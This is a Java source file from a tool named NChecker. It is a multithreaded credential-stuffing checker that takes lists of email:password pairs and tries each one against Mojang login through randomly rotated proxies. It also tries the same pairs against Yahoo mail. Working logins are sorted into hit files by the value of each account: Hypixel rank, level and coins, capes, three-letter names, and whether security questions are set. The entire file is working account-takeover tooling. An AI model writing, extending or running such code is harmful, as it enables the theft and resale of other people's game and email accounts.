package dev.tolja.Checkers.Modules;

import dev.tolja.Checkers.Checker;
import dev.tolja.Checkers.OutputManager;
import dev.tolja.Configuration.ConfigManager;
import dev.tolja.Data.HypixelProfile;
import dev.tolja.Data.MojangAccount;
import dev.tolja.Data.ProxyInfo;
import dev.tolja.Nchecker;
import dev.tolja.Utils.*;
import org.fusesource.jansi.Ansi;
import org.fusesource.jansi.AnsiConsole;
import org.fusesource.jansi.internal.Kernel32;

import java.io.File;
import java.net.Proxy;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.atomic.AtomicInteger;

public class NormalChecker extends Checker {
    private final AtomicInteger checked = new AtomicInteger();
    private final AtomicInteger fails = new AtomicInteger();
    private final AtomicInteger hits = new AtomicInteger();
    private final AtomicInteger NFA = new AtomicInteger();
    private final AtomicInteger SFA = new AtomicInteger();
    private final AtomicInteger MFA = new AtomicInteger();
    private final AtomicInteger leveled1 = new AtomicInteger();
    private final AtomicInteger leveled10 = new AtomicInteger();
    private final AtomicInteger leveled20 = new AtomicInteger();
    private final AtomicInteger ranked = new AtomicInteger();
    private final AtomicInteger OFcape = new AtomicInteger();
    private final AtomicInteger mineconcape = new AtomicInteger();
    private final AtomicInteger ELetterName = new AtomicInteger();
    private final AtomicInteger mw = new AtomicInteger();
    private final AtomicInteger UHCbasic = new AtomicInteger();
    private final AtomicInteger UHCtopest = new AtomicInteger();

    public void runChecker() {
        ConfigManager configManager = Nchecker.getConfigManager();
        Object[] resources = IOUtils.loadResources(true, configManager.getSettingsConfig().getProxyType() != Proxy.Type.DIRECT, true);
        if (resources == null) return;
        List<ProxyInfo> proxies = (List<ProxyInfo>) resources[0];
        List<MojangAccount> combos = (List<MojangAccount>) resources[1];
        List<String> apiKeys = (List<String>) resources[2];
        OutputManager outputManager = new OutputManager(new File(".", "results/NormalChecker/"), "1");
        long startTime = System.currentTimeMillis();
        Kernel32.SetConsoleTitle("NChecker | Starting thread...");
        ExecutorService threadPool = Executors.newFixedThreadPool(configManager.getSettingsConfig().getThreads());

        for (MojangAccount account : combos) {
            Future<?> submit = threadPool.submit(new Runnable() {
                public void run() {
                    int recheckCount = 0;

                    do {
                        if (configManager.getSettingsConfig().getProxyType() != Proxy.Type.DIRECT) {
                            MojangUtils.loginAccount(account, configManager.getSettingsConfig().getTimeout(), configManager.getSettingsConfig().getProxyType() != Proxy.Type.DIRECT ? proxies.get(new Random().nextInt(proxies.size())) : null);
                        } else {
                            MojangUtils.loginAccount(account, configManager.getSettingsConfig().getTimeout());
                        }
                    } while (!account.isCracked() && configManager.getSettingsConfig().getMaxRecheckCount() > recheckCount++);

                    if (account.isCracked()) {
                        recheckCount = 0;
                        HypixelProfile hypixelProfile = null;
                        account.setSecurity(MojangUtils.isSFA(account, configManager.getSettingsConfig().getTimeout()));
                        hits.getAndIncrement();
                        outputManager.writeLine("Hits.txt", account.getAccount() + ":" + account.getPassword());
                        AnsiConsole.out().println(Ansi.ansi().fgBrightGreen().a("[" + (account.isSecurity() ? "NFA" : "SFA") + "] " + account.getAccount() + ":" + account.getPassword()).reset());
                        if (account.isSecurity()) {
                            NFA.getAndIncrement();
                            outputManager.writeLine("NFA.txt", account.getAccount() + ":" + account.getPassword());
                        } else {
                            SFA.getAndIncrement();
                            outputManager.writeLine("SFA.txt", account.getAccount() + ":" + account.getPassword());
                        }
                        if (CapeUtils.checkOf(account.getPlayerName())) {
                            account.setCapetype("Optifine");
                            AnsiConsole.out().println(Ansi.ansi().fgBrightYellow().a("[Of cape]" + account.getAccount() + account.getPassword()).reset());
                            outputManager.writeLine("Optifine.txt", account.getAccount() + ":" + account.getPassword());
                            OFcape.getAndIncrement();
                        }

                        if (CapeUtils.checkMinecon(account.getUuid(), configManager.getSettingsConfig().getProxyType() != Proxy.Type.DIRECT ? proxies.get(new Random().nextInt(proxies.size())) : null)) {
                            account.setCapetype(account.getCapetype() == null || account.getCapetype().equalsIgnoreCase("") ? "+Minecon" : "Minecon");
                            AnsiConsole.out().println(Ansi.ansi().fgBrightYellow().a("[Minecon cape]" + account.getAccount() + account.getPassword()).reset());
                            mineconcape.getAndIncrement();
                            outputManager.writeLine("Minecon.txt", account.getAccount() + ":" + account.getPassword());
                        }

                        if (YahooUtils.checkYahoo(account.getAccount(),account.getPassword(),configManager.getSettingsConfig().getProxyType() != Proxy.Type.DIRECT ? proxies.get(new Random().nextInt(proxies.size())) : null)) {
                            AnsiConsole.out().println(Ansi.ansi().fgBrightYellow().a("[MFA]" + account.getAccount() + account.getPassword()).reset());
                            MFA.getAndIncrement();
                            outputManager.writeLine("MFA.txt", account.getAccount() + ":" + account.getPassword());
                        }

                        if (account.getPlayerName().length() <= 3) {
                            account.setELetterName(true);
                        }

                        if (configManager.getSettingsConfig().isHypixelCheck()) {
                            do {
                                hypixelProfile = HypixelUtils.getHypixelProfile(apiKeys.get(new Random().nextInt(apiKeys.size())), account.getUuid(), configManager.getSettingsConfig().getTimeout(), null);
                            } while (hypixelProfile == null && configManager.getSettingsConfig().getMaxRecheckCount() > recheckCount++);
                            if (configManager.getSettingsConfig().isHypixelJson()) {
                                System.out.println(hypixelProfile);
                            }
                            if (hypixelProfile != null) {
                                if (hypixelProfile.getUhcBasic() && configManager.getSettingsConfig().isCheckUHC()) {
                                    UHCbasic.getAndIncrement();
                                    AnsiConsole.out().println(Ansi.ansi().fgBrightMagenta().a("[Hypixel UHCbasic] " + account.getAccount() + ":" + account.getPassword()).reset());
                                    outputManager.writeLine((account.isSecurity() ? "[NFA]UHCbasic.txt" : "[SFA]UHCbasic.txt"), account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | " + "lvl:" + hypixelProfile.getNetworkLevel() + " rank:" + hypixelProfile.getHypixelRank() + " uhc:" + hypixelProfile.getUhcStar() + " sw:" + hypixelProfile.getSkywarsprofile() + " bw:" + hypixelProfile.getBedwarsStar());
                                } else if (hypixelProfile.getUhcTopest() && configManager.getSettingsConfig().isCheckUHC()) {
                                    UHCtopest.getAndIncrement();
                                    AnsiConsole.out().println(Ansi.ansi().fgBrightMagenta().a("[Hypixel UHCtopest] " + account.getAccount() + ":" + account.getPassword()).reset());
                                    outputManager.writeLine((account.isSecurity() ? "[NFA]UHCtopest.txt" : "[SFA]UHCtopest.txt"), account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | " + "lvl:" + hypixelProfile.getNetworkLevel() + " rank:" + hypixelProfile.getHypixelRank() + " uhc:" + hypixelProfile.getUhcStar() + " sw:" + hypixelProfile.getSkywarsprofile() + " bw:" + hypixelProfile.getBedwarsStar());
                                } else if (account.isELetterName()) {
                                    ELetterName.getAndIncrement();
                                    AnsiConsole.out().println(Ansi.ansi().fgBrightMagenta().a("[3LetterName] " + account.getAccount() + ":" + account.getPassword()).reset());
                                    outputManager.writeLine((account.isSecurity() ? "[NFA]3LetterName.txt" : "[SFA]3LetterName.txt"), account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | "  + "lvl:" + hypixelProfile.getNetworkLevel() + " rank:" + hypixelProfile.getHypixelRank() + " uhc:" + hypixelProfile.getUhcStar() + " sw:" + hypixelProfile.getSkywarsprofile() + " bw:" + hypixelProfile.getBedwarsStar());
                                } else if (hypixelProfile.getMwcoins() >= 15000 && configManager.getSettingsConfig().isCheckMW()) {
                                    mw.getAndIncrement();
                                    AnsiConsole.out().println(Ansi.ansi().fgBrightMagenta().a("[MW] " + account.getAccount() + ":" + account.getPassword()).reset());
                                    outputManager.writeLine((account.isSecurity() ? "[NFA]MW.txt" : "[SFA]MW.txt"), account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | "  + "lvl:" + hypixelProfile.getNetworkLevel() + " rank:" + hypixelProfile.getHypixelRank() + " uhc:" + hypixelProfile.getUhcStar() + " sw:" + hypixelProfile.getSkywarsprofile() + " bw:" + hypixelProfile.getBedwarsStar());
                                } else if (hypixelProfile.getNetworkLevel() > configManager.getSettingsConfig().getMaxLevel() && configManager.getSettingsConfig().isCheckLeveled()) {
                                    leveled20.getAndIncrement();
                                    if (hypixelProfile.getHypixelRank() != null && configManager.getSettingsConfig().isCheckRanked()) {
                                        AnsiConsole.out().println(Ansi.ansi().fgBrightCyan().a("[Hypixel " + hypixelProfile.getHypixelRank() + "20+] " + account.getAccount() + ":" + account.getPassword()).reset());
                                        outputManager.writeLine((account.isSecurity() ? "[NFA]" + hypixelProfile.getHypixelRank() + "_Leveled 20+.txt" : "[SFA]" + hypixelProfile.getHypixelRank() + "_Leveled 20+.txt"), account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | "  + "lvl:" + hypixelProfile.getNetworkLevel() + " rank:" + hypixelProfile.getHypixelRank() + " uhc:" + hypixelProfile.getUhcStar() + " sw:" + hypixelProfile.getSkywarsprofile() + " bw:" + hypixelProfile.getBedwarsStar());
                                        ranked.getAndIncrement();
                                    } else {
                                        AnsiConsole.out().println(Ansi.ansi().fgBrightCyan().a("[Hypixel 20+] " + account.getAccount() + ":" + account.getPassword()).reset());
                                        outputManager.writeLine((account.isSecurity() ? "[NFA]Leveled 20+.txt" : "[SFA]Leveled 20+.txt"), account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | "  + "lvl:" + hypixelProfile.getNetworkLevel() + " uhc:" + hypixelProfile.getUhcStar() + " sw:" + hypixelProfile.getSkywarsprofile() + " bw:" + hypixelProfile.getBedwarsStar());
                                    }
                                } else if (hypixelProfile.getNetworkLevel() > configManager.getSettingsConfig().getMinLevel() && configManager.getSettingsConfig().isCheckLeveled()) {
                                    leveled10.getAndIncrement();
                                    if (hypixelProfile.getHypixelRank() != null && configManager.getSettingsConfig().isCheckRanked()) {
                                        AnsiConsole.out().println(Ansi.ansi().fgBrightCyan().a("[Hypixel " + hypixelProfile.getHypixelRank() + "10+] " + account.getAccount() + ":" + account.getPassword()).reset());
                                        outputManager.writeLine((account.isSecurity() ? "[NFA]" + hypixelProfile.getHypixelRank() + "_Leveled 10+.txt" : "[SFA]" + hypixelProfile.getHypixelRank() + "_Leveled 10+.txt"), account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | "  + "lvl:" + hypixelProfile.getNetworkLevel() + " rank:" + hypixelProfile.getHypixelRank() + " uhc:" + hypixelProfile.getUhcStar() + " sw:" + hypixelProfile.getSkywarsprofile() + " bw:" + hypixelProfile.getBedwarsStar());
                                        ranked.getAndIncrement();
                                    } else {
                                        AnsiConsole.out().println(Ansi.ansi().fgBrightBlue().a("[Hypixel 10+] " + account.getAccount() + ":" + account.getPassword()).reset());
                                        outputManager.writeLine((account.isSecurity() ? "[NFA]Leveled 10+.txt" : "[SFA]Leveled 10+.txt"), account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | "  + "lvl:" + hypixelProfile.getNetworkLevel() + " uhc:" + hypixelProfile.getUhcStar() + " sw:" + hypixelProfile.getSkywarsprofile() + " bw:" + hypixelProfile.getBedwarsStar());
                                    }
                                } else {
                                    leveled1.getAndIncrement();
                                    if (hypixelProfile.getHypixelRank() != null && configManager.getSettingsConfig().isCheckRanked()) {
                                        AnsiConsole.out().println(Ansi.ansi().fgBrightCyan().a("[Hypixel " + hypixelProfile.getHypixelRank() + "1+] " + account.getAccount() + ":" + account.getPassword()).reset());
                                        outputManager.writeLine((account.isSecurity() ? "[NFA]" + hypixelProfile.getHypixelRank() + "_Leveled 1+.txt" : "[SFA]" + hypixelProfile.getHypixelRank() + "_Leveled 1+.txt"), account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | "  + "lvl:" + hypixelProfile.getNetworkLevel() + " rank:" + hypixelProfile.getHypixelRank() + " uhc:" + hypixelProfile.getUhcStar() + " sw:" + hypixelProfile.getSkywarsprofile() + " bw:" + hypixelProfile.getBedwarsStar());
                                        ranked.getAndIncrement();
                                    } else {
                                        outputManager.writeLine((account.isSecurity() ? "[NFA]Leveled 1+.txt" : "[SFA]Leveled 1+.txt"), account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName() + " | "  + "lvl:" + hypixelProfile.getNetworkLevel() + " uhc:" + hypixelProfile.getUhcStar() + " sw:" + hypixelProfile.getSkywarsprofile() + " bw:" + hypixelProfile.getBedwarsStar());
                                    }
                                }
                            } else {
                                AnsiConsole.out().println(Ansi.ansi().fg(Ansi.Color.GREEN).a("[" + (account.isSecurity() ? "NFA" : "SFA") + "_NoLogin] " + account.getAccount() + ":" + account.getPassword()).reset());
                                outputManager.writeLine((account.isSecurity() ? "NFA_Nologin.txt" : "SFA_Nologin.txt"), account.getAccount() + ":" + account.getPassword());
                            }
                        }
                    } else {
                        fails.getAndIncrement();
                        if (configManager.getSettingsConfig().isPrintFailed()) {
                            AnsiConsole.out().println(Ansi.ansi().fgBrightRed().a("[Failed] " + account.getAccount() + ":" + account.getPassword()).reset());
                        }
                        if (configManager.getSettingsConfig().isSaveFailed()) {
                            outputManager.writeLine("Failed.txt", account.getAccount() + ":" + account.getPassword());
                        }
                    }
                    checked.getAndIncrement();
                }
            });
        }
        threadPool.shutdown();
        SimpleDateFormat dateFormat = new SimpleDateFormat("HH:mm:ss");
        while (!threadPool.isTerminated()) {
            try {
                int time = (int) ((System.currentTimeMillis() - startTime) / 1000);
                Kernel32.SetConsoleTitle("NChecker"
                        + " | Checked: " + checked.get() + "/" + combos.size() + " (" + String.format("%.2f", (double) checked.get() / combos.size() * 100) + "%)"
                        + " | Hits: " + hits.get() + " - " + "Failed: " + fails.get() + "| Cpm: " + (int) Math.ceil((double) checked.get() / time * 60)
                        + " | Elapsed: " + dateFormat.format(new Date(System.currentTimeMillis() - startTime - (8 * 60 * 60 * 1000))));
                Thread.sleep(1000);
            } catch (Exception ignored) {
            }
        }
        Kernel32.SetConsoleTitle("NChecker | Ver " + Nchecker.VERSION);
        AnsiConsole.out.println(Ansi.ansi().fg(Ansi.Color.CYAN).a(
                "\r\nAll done.\r\n"
        ).reset());
        AnsiConsole.out.println(Ansi.ansi().fgBrightYellow().a("NFA: " + NFA.get() + "\r\n" +
                "SFA: " + SFA.get() + "\r\n" +
                "MFA: " + MFA.get() + "\r\n" +
                "3LetterName: " + ELetterName.get() + "\r\n" +
                "Leveled 1+: " + leveled1.get() + "\r\n" +
                "Leveled 10+: " + leveled10.get() + "\r\n" +
                "Leveled 20+: " + leveled20.get() + "\r\n" +
                "MW: " + mw.get()  + "\r\n" +
                "Ranked: " + ranked.get() + "\r\n" +
                "Optifine Cape: " + OFcape.get() + "\r\n" +
                "Minecon Cape: " + mineconcape.get() + "\r\n" +
                "UHC basic: " + UHCbasic.get() + "\r\n" +
                "UHC topest: " + UHCtopest.get() + "\r\n"
        ).reset());
    }

}
